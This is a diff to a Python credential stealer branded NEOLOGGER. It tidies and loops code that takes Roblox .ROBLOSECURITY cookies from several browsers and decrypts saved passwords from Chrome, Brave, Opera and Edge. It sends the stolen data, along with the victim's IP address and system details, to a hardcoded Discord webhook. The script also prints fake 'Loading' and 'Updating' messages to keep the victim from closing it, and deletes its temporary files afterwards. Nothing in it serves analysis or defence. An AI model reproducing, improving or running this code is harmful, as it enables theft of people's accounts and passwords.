@@ -1,8 +1,9 @@
+python
 import os
 try:
     import json, base64, sqlite3, win32crypt, shutil, requests, getpass, socket, platform, psutil
     from Crypto.Cipher import AES
-    from discord import SyncWebhook # Import SyncWebhook
+    from discord import SyncWebhook
     from discord_webhook import DiscordWebhook, DiscordEmbed
 except ModuleNotFoundError:
     print("modules are not installed")
@@ -42,7 +43,7 @@ import robloxpy
 import requests,re
 from discordwebhook import *
 import browser_cookie3
-import colorama 
+import colorama
 from colorama import Back, Fore, Style
 
 colorama.init()
@@ -54,10 +55,10 @@ from base64 import *
 
 dummy_message = Fore.MAGENTA + "Loading NEOWARE..." # A message that distracts the user from closing the grabber
 print(dummy_message)
-        
+
 #################### ADDING SHI #################
 
-import colorama 
+import colorama
 from colorama import Back, Fore, Style
 
 colorama.init()
@@ -79,100 +80,50 @@ try:
     import requests,re
     from discordwebhook import *
     import browser_cookie3
-    
 except:
     input("Libraries not installed press enter to exit...")
-
-
-
 
 dummy_message = Fore.MAGENTA + "Updating..." # A message that distracts the user from closing the grabber
 print(dummy_message)
 ################### Gathering INFOMATION #################################
+
 def cookieLogger():
     data = []  # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
-
-    # Retrieve cookies from Opera GX
-    try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    
-    return None  # Return None if no .ROBLOSECURITY cookies are found
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    try:
-        cookies = browser_cookie3.chromium(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    
+    for browser in ['firefox', 'chromium', 'edge', 'opera', 'chrome']:
+        try:
+            cookies = getattr(browser_cookie3, browser)(domain_name='roblox.com')
+            for cookie in cookies:
+                if cookie.name == '.ROBLOSECURITY':
+                    data.append(cookies)
+                    data.append(cookie.value)
+                    return data
+        except:
+            pass
     return None  # Return None if no .ROBLOSECURITY cookies are found
 
 cookies = cookieLogger()
 if cookies is None:
     requests.post(url=send_webhook, data={"content": "No .ROBLOSECURITY cookies found."})
     exit()
-    
 if len(cookies) < 2:
     requests.post(url=send_webhook, data={"content": "No .ROBLOSECURITY cookie found."})
     exit()
-    
+
 roblox_cookie = cookies[1]
 ip_address = requests.get("https://api.ipify.org/").text
+
 #################### checking cookie #############
+
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
     pass
 else:
-    requests.post(url=send_webhook,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
+    requests.post(url=send_webhook, data={"content": f"R.I.P, cookie is expired\ndead cookie: skull: : ```{roblox_cookie}```"})
     exit()
 
 #################### getting info about the cookie #############
-ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
+
+ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie})
 info = json.loads(ebruh.text)
 rid = info["UserID"]
 rap = robloxpy.User.External.GetRAP(rid)
@@ -185,6 +136,7 @@ headshot = robloxpy.User.External.GetHeadshot(rid)
 username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
+
 #################### SENDING TO WEBHOOK #################
 
 discord = Discord(url=send_webhook)
@@ -195,22 +147,20 @@ discord.post(
         {
             "username": "NEOLOGGER ",
             "title": " 💸 Roblox account 💸",
-            "description" : f"[NEOLOGGER](https://mega.nz/folder/KENRDBoL#6TuJNxYiJChvvytJ857waA) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
-            "color" : 00000000,
+            "description": f"[NEOLOGGER](https://mega.nz/folder/KENRDBoL#6TuJNxYiJChvvytJ857waA) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "color": 00000000,
             "fields": [
                 {"name": "Username", "value": username, "inline": True},
                 {"name": "Robux Balance", "value": robux, "inline": True},
-                {"name": "Premium Status", "value": premium,"inline": True},
+                {"name": "Premium Status", "value": premium, "inline": True},
                 {"name": "Creation Date", "value": crdate, "inline": True},
-                {"name" : "RAP", "value": rap,"inline": True},
-                {"name" : "Friends", "value": friends, "inline": True},
-                {"name" : "Account Age", "value": age, "inline": True},
-                {"name" : "IP Address", "value" : ip_address, "inline:": True},
-                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
+                {"name": "RAP", "value": rap, "inline": True},
+                {"name": "Friends", "value": friends, "inline": True},
+                {"name": "Account Age", "value": age, "inline": True},
+                {"name": "IP Address", "value": ip_address, "inline": True},
+                {"name": ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
             ],
             "thumbnail": {"url": headshot},
-
-
         }
     ],
 )
@@ -218,10 +168,13 @@ discord.post(
 #######################################################################
 #WARNING WEBHOOK IS INSTALLED CHANGE BEFORE EXECUTED!#
 #######################################################################
+
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
+
 def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
+
 def decrypt_password(buff, master_key):
     try:
         iv = buff[3:15]
@@ -232,6 +185,7 @@ def decrypt_password(buff, master_key):
         return decrypted_pass
     except Exception as e:
         print(str(e))
+
 def get_size(bytes, suffix="B"):
     factor = 1024
     for unit in ["", "K", "M", "G", "T", "P"]:
@@ -239,17 +193,15 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL" #WEBHOOK URL GOES INSIDE THE QOUTES!
-webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL]') # Initializing webhook
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL"
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL]')
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
 hostname = socket.gethostname()
 svmem = psutil.virtual_memory()
 webhookembed = DiscordWebhook(url=WEBHOOK_URL)
 total, used, free = shutil.disk_usage("/")
-#######################################################################
-#######################################################################
-#######################################################################
+
 try:
     def get_master_key():
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
@@ -262,7 +214,7 @@ try:
     if __name__ == '__main__':
         master_key = get_master_key()
         login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
-        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+        shutil.copy2(login_db, "Loginvault.db")
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
         try:
@@ -274,9 +226,8 @@ try:
                 decrypted_password = decrypt_password(encrypted_password, master_key)
                 with open("GooglePasswords.txt","a") as f:
                     f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
-                    f.close()
-            with open("GooglePasswords.txt", "rb") as f:
-                webhookembed.add_file(file=f.read(), filename='GooglePasswords.txt')
+                with open("GooglePasswords.txt", "rb") as f:
+                    webhookembed.add_file(file=f.read(), filename='GooglePasswords.txt')
         except Exception as e:
             pass
         cursor.close()
@@ -287,9 +238,7 @@ try:
             pass
 except FileNotFoundError:
     webhook.send(f"```USER HAS NOT INSTALLED GOOGLE CHROME OR THERE IS NO DATA!```")
-#######################################################################
-#######################################################################
-#######################################################################
+
 try:
     def get_master_key():
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
@@ -302,7 +251,7 @@ try:
     if __name__ == '__main__':
         master_key = get_master_key()
         login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
-        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+        shutil.copy2(login_db, "Loginvault.db")
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
         try:
@@ -314,9 +263,8 @@ try:
                 decrypted_password = decrypt_password(encrypted_password, master_key)
                 with open("BravePasswords.txt","a") as f:
                     f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
-                    f.close()
-            with open("BravePasswords.txt", "rb") as f:
-                webhookembed.add_file(file=f.read(), filename='BravePasswords.txt')
+                with open("BravePasswords.txt", "rb") as f:
+                    webhookembed.add_file(file=f.read(), filename='BravePasswords.txt')
         except Exception as e:
             pass
         cursor.close()
@@ -327,9 +275,7 @@ try:
             pass
 except FileNotFoundError:
     webhook.send(f"```USER HAS NOT INSTALLED BRAVE BROWSER OR THERE IS NO DATA!```")
-#######################################################################
-#######################################################################
-#######################################################################
+
 try:
     def get_master_key():
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
@@ -342,7 +288,7 @@ try:
     if __name__ == '__main__':
         master_key = get_master_key()
         login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
-        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+        shutil.copy2(login_db, "Loginvault.db")
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
         try:
@@ -354,9 +300,8 @@ try:
                 decrypted_password = decrypt_password(encrypted_password, master_key)
                 with open("OperaPasswords.txt","a") as f:
                     f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
-                    f.close()
-            with open("OperaPasswords.txt", "rb") as f:
-                webhookembed.add_file(file=f.read(), filename='OperaPasswords.txt')
+                with open("OperaPasswords.txt", "rb") as f:
+                    webhookembed.add_file(file=f.read(), filename='OperaPasswords.txt')
         except Exception as e:
             pass
         cursor.close()
@@ -367,10 +312,7 @@ try:
             pass
 except FileNotFoundError:
     webhook.send(f"```USER HAS NOT INSTALLED OPERA OR THERE IS NO DATA!```")
-    pass
-#######################################################################
-#######################################################################
-#######################################################################
+
 try:
     def get_master_key():
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
@@ -383,7 +325,7 @@ try:
     if __name__ == '__main__':
         master_key = get_master_key()
         login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
-        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+        shutil.copy2(login_db, "Loginvault.db")
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
         try:
@@ -395,9 +337,8 @@ try:
                 decrypted_password = decrypt_password(encrypted_password, master_key)
                 with open("EdgePasswords.txt","a") as f:
                     f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
-                    f.close()
-            with open("EdgePasswords.txt", "rb") as f:
-                webhookembed.add_file(file=f.read(), filename='EdgePasswords.txt')
+                with open("EdgePasswords.txt", "rb") as f:
+                    webhookembed.add_file(file=f.read(), filename='EdgePasswords.txt')
         except Exception as e:
             pass
         cursor.close()
@@ -408,8 +349,6 @@ try:
             pass
 except FileNotFoundError:
     webhook.send(f"```USER HAS NOT INSTALLED MICROSOFT EDGE OR THERE IS NO DATA!```")
-########################################################################################
-##FOR EXTRA DATA
 
 embed = DiscordEmbed(title='Extra Data')
 embed.set_footer(text='https://linktr.ee/cxllz')
@@ -420,6 +359,3 @@ webhookembed.add_embed(embed)
 
 response = webhookembed.execute()
 os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")
-#######################################################################
-#END OF SCRIPT
-#######################################################################
